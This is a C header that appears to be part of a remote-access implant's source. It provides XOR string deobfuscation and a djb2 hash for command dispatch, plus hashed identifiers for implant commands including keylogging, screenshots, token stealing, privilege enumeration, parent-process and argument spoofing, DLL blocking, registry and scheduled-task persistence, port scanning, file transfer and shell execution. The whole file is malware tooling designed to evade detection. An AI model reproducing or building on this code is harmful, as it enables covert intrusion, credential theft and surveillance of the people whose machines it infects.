#ifndef OBFSTR_H
#define OBFSTR_H

#define OBF_KEY 0x4B

static inline void xdec(char *buf, size_t len) {
    volatile char *p = (volatile char *)buf;
    for (size_t i = 0; i < len; i++) p[i] ^= OBF_KEY;
}

static inline unsigned int cmd_hash(const char *s) {
    unsigned int h = 5381;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

#define CMD_SLEEP              0x105CF61Eu
#define CMD_WHOAMI             0x250D652Au
#define CMD_PS                 0x00597928u
#define CMD_PWD                0x0B889F10u
#define CMD_CD                 0x0059776Cu
#define CMD_GETUID             0xFF87A407u
#define CMD_BOF                0x0B88627Cu
#define CMD_DOWNLOAD           0x438451DDu
#define CMD_UPLOAD             0x20F26CCAu
#define CMD_SCREENSHOT         0x9A37F083u
#define CMD_PORTSCAN           0x4B60B7EFu
#define CMD_KEYLOGGER          0x3E5F7C8Eu
#define CMD_STEAL_TOKEN        0x8280B7FEu
#define CMD_MAKE_TOKEN         0x159E4EC3u
#define CMD_REV2SELF           0x26C85D4Eu
#define CMD_GETPRIVS           0xFFAB5B99u
#define CMD_RUNAS              0x104FF2CEu
#define CMD_BLOCKDLLS          0x84BD977Fu
#define CMD_ARGSPOOF           0x40B7AD46u
#define CMD_PPIDSPOOF          0xC9A23AD9u
#define CMD_PERSIST_REGISTRY   0x21EEEEC7u
#define CMD_PERSIST_SCHTASK    0x39EB1BFFu
#define CMD_PERSIST_REMOVE     0xAA3DACBCu
#define CMD_EXIT               0x7C967E3Fu
#define CMD_EXEC               0x7C967DAAu
#define CMD_SHELL              0x105AC57Du

#endif
